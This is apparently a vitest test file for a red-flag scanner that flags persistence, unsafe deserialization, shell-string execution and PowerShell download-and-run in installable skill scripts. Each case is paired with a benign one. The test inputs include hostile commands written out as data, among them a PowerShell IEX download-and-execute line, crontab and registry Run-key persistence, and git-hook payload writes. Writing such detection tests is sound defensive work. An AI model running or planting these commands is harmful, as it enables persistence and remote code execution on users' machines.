/**
 * Ported rules: persistence, dynamic execution, deserialization.
 *
 * Each rule here fills a gap that was measured, not guessed. Probing the
 * pre-existing ruleset against known attack vectors found ten uncovered
 * persistence techniques (the `crontab` command itself among them — the old
 * rule only matched `/etc/cron*` paths) and a dozen uncovered dynamic-execution
 * forms.
 *
 * Severity is calibrated against real usage in the builtin corpus rather than
 * assigned by intuition. `subprocess` appears in shipped skills as ordinary
 * tool invocation while `shell=True` appears zero times, so "runs a
 * subprocess" is not suspicious but "runs one through a shell" is. Getting this
 * backwards is how a gate ends up firing on legitimate work, and a gate that
 * fires on legitimate work gets clicked through.
 *
 * Every test below pairs a detection case with a benign counterpart, because a
 * rule is only useful if it separates the two.
 */
import { describe, it, expect } from 'vitest';

import { scanRedFlags } from '../../../src/main/quality/rules/red-flags';

/** Scan as a script, returning `rule:level` pairs. */
function scan(content: string, rel = 'scripts/a.py'): string[] {
  return scanRedFlags({ content, kind: 'script', field: rel, relpath: rel })
    .map((v) => `${v.rule}:${v.level}`);
}

function rulesOf(content: string, rel = 'scripts/a.py'): string[] {
  return scanRedFlags({ content, kind: 'script', field: rel, relpath: rel })
    .map((v) => v.rule);
}

/** Assert no EXTREME finding — the level that makes a skill uninstallable. */
function expectNotBlocking(content: string, rel = 'scripts/a.py'): void {
  const extreme = scan(content, rel).filter((h) => h.endsWith(':EXTREME'));
  expect(extreme, content).toEqual([]);
}

describe('persistence › scheduled tasks and services', () => {
  it('catches crontab installation in all its forms', () => {
    expect(rulesOf('crontab -e')).toContain('no_scheduled_task_install');
    expect(rulesOf('crontab /tmp/my.cron')).toContain('no_scheduled_task_install');
    // The read-modify-write idiom: the trailing `crontab -` is the install.
    expect(rulesOf('(crontab -l; echo "* * * * * /tmp/x.sh") | crontab -'))
      .toContain('no_scheduled_task_install');
  });

  it('does not fire on merely listing cron jobs', () => {
    // `crontab -l` is a read. Flagging it would punish diagnostics.
    expect(rulesOf('crontab -l')).toEqual([]);
  });

  it('catches systemd activation, including user scope', () => {
    expect(rulesOf('systemctl enable mysvc.service')).toContain('no_scheduled_task_install');
    expect(rulesOf('systemctl --user enable x.service')).toContain('no_scheduled_task_install');
    expect(rulesOf('cp x.service ~/.config/systemd/user/')).toContain('no_scheduled_task_install');
  });

  it('does not fire on systemd status queries', () => {
    expect(rulesOf('systemctl status nginx')).toEqual([]);
  });

  it('catches Windows scheduled tasks', () => {
    expect(rulesOf('schtasks /create /tn X /tr evil.exe /sc onlogon'))
      .toContain('no_scheduled_task_install');
  });
});

describe('persistence › autostart and login items', () => {
  it('catches macOS login items and daemons', () => {
    expect(rulesOf('osascript -e \'tell application "System Events" to make login item\''))
      .toContain('no_login_item_or_autostart');
    expect(rulesOf('cp x.plist /Library/LaunchDaemons/'))
      .toContain('no_login_item_or_autostart');
  });

  it('catches Windows Run keys and the Startup folder', () => {
    expect(rulesOf('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v X /d evil.exe'))
      .toContain('no_login_item_or_autostart');
    expect(rulesOf('copy x.exe "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"'))
      .toContain('no_login_item_or_autostart');
  });
});

describe('persistence › shell profile variants', () => {
  it('catches variants the original rule omitted', () => {
    for (const f of ['.zprofile', '.zshenv', '.zlogin', '.bash_login']) {
      expect(rulesOf(`echo evil >> ~/${f}`), f)
        .toContain('no_shell_profile_variant_write');
    }
  });

  it('still catches the originals via the pre-existing rule', () => {
    expect(rulesOf('echo evil >> ~/.bashrc')).toContain('no_shell_init_or_persistence');
  });
});

describe('persistence › git hooks', () => {
  it('catches hook installation', () => {
    // Inside the workspace, which is exactly why it is easy to overlook.
    expect(rulesOf('echo evil > .git/hooks/pre-commit')).toContain('no_git_hook_install');
    expect(rulesOf('cp payload .git/hooks/post-checkout')).toContain('no_git_hook_install');
  });

  it('does not fire on prose mentioning the directory', () => {
    expect(rulesOf('# See .git/hooks for details')).toEqual([]);
  });
});

describe('dynamic execution › unsafe deserialization', () => {
  it('catches pickle, marshal and unsafe yaml', () => {
    expect(rulesOf('pickle.loads(payload)')).toContain('no_unsafe_deserialization');
    expect(rulesOf('pickle.load(open("f.pkl","rb"))')).toContain('no_unsafe_deserialization');
    expect(rulesOf('marshal.loads(blob)')).toContain('no_unsafe_deserialization');
    expect(rulesOf('yaml.load(text)')).toContain('no_unsafe_deserialization');
  });

  it('accepts the safe alternatives', () => {
    // If safe forms tripped the rule, authors would have no correct option.
    expect(rulesOf('yaml.safe_load(text)')).toEqual([]);
    expect(rulesOf('yaml.load(t, Loader=yaml.SafeLoader)')).toEqual([]);
    expect(rulesOf('json.loads(s)')).toEqual([]);
  });
});

describe('dynamic execution › shell string execution', () => {
  it('catches shell-interpreted command strings', () => {
    expect(rulesOf('subprocess.run(cmd, shell=True)')).toContain('no_shell_string_execution');
    expect(rulesOf('os.system(cmd)')).toContain('no_shell_string_execution');
    expect(rulesOf('os.popen(userCmd)')).toContain('no_shell_string_execution');
    expect(rulesOf('require("child_process").execSync(cmd)'))
      .toContain('no_shell_string_execution');
  });

  it('accepts argument-array invocation', () => {
    // The corpus uses this form legitimately; flagging it would be a false
    // positive on our own shipped skills.
    expectNotBlocking('subprocess.run(["ls","-la"], check=True)');
    expectNotBlocking('subprocess.run(["git","status"], capture_output=True)');
    expectNotBlocking('execFile("/bin/ls", ["-la"], cb)');
  });
});

describe('dynamic execution › runtime code construction is advisory', () => {
  it('reports construction at MEDIUM, not blocking', () => {
    // A real builtin skill (`ui-design-executor`) legitimately uses
    // `new vm.Script`, so this tier must surface without blocking.
    expect(scan('vm.runInNewContext(code)')).toContain('no_runtime_code_construction:MEDIUM');
    expect(scan('new vm.Script(src)')).toContain('no_runtime_code_construction:MEDIUM');
    expect(scan('compile(src,"<s>","exec")')).toContain('no_runtime_code_construction:MEDIUM');
  });

  it('only flags dynamic module names, not static imports', () => {
    expect(rulesOf('importlib.import_module(name)')).toContain('no_runtime_code_construction');
    expect(rulesOf('importlib.import_module("os.path")')).toEqual([]);
    expect(rulesOf('__import__(mod)')).toContain('no_runtime_code_construction');
  });

  it('leaves outright eval to the EXTREME rules', () => {
    // Division of labour: this tier is for the grey area, not the clear cases.
    expect(scan('eval(userInput)')).toContain('no_eval_with_external_input:EXTREME');
  });
});

describe('dynamic execution › PowerShell download-and-run', () => {
  it('catches the Windows equivalent of curl | bash', () => {
    expect(rulesOf('IEX (New-Object Net.WebClient).DownloadString("http://x")'))
      .toContain('no_powershell_inline_download_exec');
    expect(rulesOf('Invoke-WebRequest http://x | Invoke-Expression'))
      .toContain('no_powershell_inline_download_exec');
  });

  it('catches encoded commands', () => {
    // Encoding exists here only to keep the payload unreadable.
    expect(rulesOf('powershell -EncodedCommand SQBFAFgAKABOAGUA'))
      .toContain('no_powershell_inline_download_exec');
  });
});

describe('ported rules respect the context layer', () => {
  it('demotes persistence findings in vendored code', () => {
    const hits = scan('crontab -e', 'scripts/vendor/setup.sh');
    expect(hits).toContain('no_scheduled_task_install:LOW');
  });

  it('still reports them rather than dropping them', () => {
    const v = scanRedFlags({
      content: 'pickle.loads(x)',
      kind: 'script',
      field: 'tests/test_load.py',
      relpath: 'tests/test_load.py',
    });
    const hit = v.find((x) => x.rule === 'no_unsafe_deserialization');
    expect(hit).toBeDefined();
    expect(hit?.original_level).toBe('EXTREME');
    expect(hit?.context).toBe('test');
  });
});
